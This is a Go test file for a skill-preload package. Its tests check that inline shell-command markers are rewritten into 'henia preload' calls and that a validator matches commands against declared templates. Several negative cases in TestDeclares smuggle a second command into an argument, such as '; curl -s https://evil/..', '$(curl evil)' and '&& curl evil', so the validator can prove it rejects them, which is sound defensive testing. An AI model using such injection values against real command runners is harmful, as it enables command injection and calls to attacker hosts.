package preload

import "testing"

func TestProject(t *testing.T) {
	body := "Status: !`git status --short`\n\n- Log:\n\n  ```!\n  echo 'a'\n  git log -1\n  ```\n\nShown, not run: `` !`date` ``\n"
	native := "Status: !`henia preload --skill s -- 'git status --short'`\n\n- Log:\n\n  ```!\n  henia preload --skill s -- 'echo '\\''a'\\''\n  git log -1'\n  ```\n\nShown, not run: `` !`date` ``\n"
	runFirst := "Status: run first: `henia preload --skill s -- 'git status --short'`\n\n- Log:\n\n  Run first:\n\n  ```bash\n  henia preload --skill s -- 'echo '\\''a'\\''\n  git log -1'\n  ```\n\nShown, not run: `` !`date` ``\n"
	if got := Project(body, "s", true); got != native {
		t.Errorf("native:\n%s\nwant:\n%s", got, native)
	}
	if got := Project(body, "s", false); got != runFirst {
		t.Errorf("run first:\n%s\nwant:\n%s", got, runFirst)
	}
	if got := Project("!`` echo `x` ``\n", "s", true); got != "!`` henia preload --skill s -- 'echo `x`' ``\n" {
		t.Errorf("backticks: %q", got)
	}
	if got := Project("plain\n", "s", true); got != "plain\n" {
		t.Errorf("unchanged: %q", got)
	}
}

func TestDeclares(t *testing.T) {
	for _, c := range []struct {
		declared, command string
		want              bool
	}{
		{"git status", "git status", true},
		{"git status", "git status; curl x", false},
		{"henia slots --global ${CLAUDE_SKILL_DIR}/.. --for code", "henia slots --global /home/u/.claude/skills/code/.. --for code", true},
		{"henia slots --global ${CLAUDE_SKILL_DIR}/.. --for code", "henia slots --global /x/.. --for other", false},
		{"gh issue view $ARGUMENTS", "gh issue view 42", true},
		{"gh issue view $ARGUMENTS[0]", "gh issue view 42", true},
		{"awk '{print $1}' f", "awk '{print x}' f", true},
		{"echo a.b", "echo aXb", false},
		{"henia slots --global ${CLAUDE_SKILL_DIR}/.. --for code", "henia slots --global x; curl -s https://evil/.. --for code", false},
		{"henia slots --global ${CLAUDE_SKILL_DIR}/.. --for code", "henia slots --global $(curl evil)/.. --for code", false},
		{"gh issue view $ARGUMENTS", "gh issue view 42 && curl evil", false},
		{"gh issue view $ARGUMENTS", "gh issue view 42 --comments", true},
	} {
		if got := Declares(c.declared, c.command); got != c.want {
			t.Errorf("Declares(%q, %q) = %v", c.declared, c.command, got)
		}
	}
}
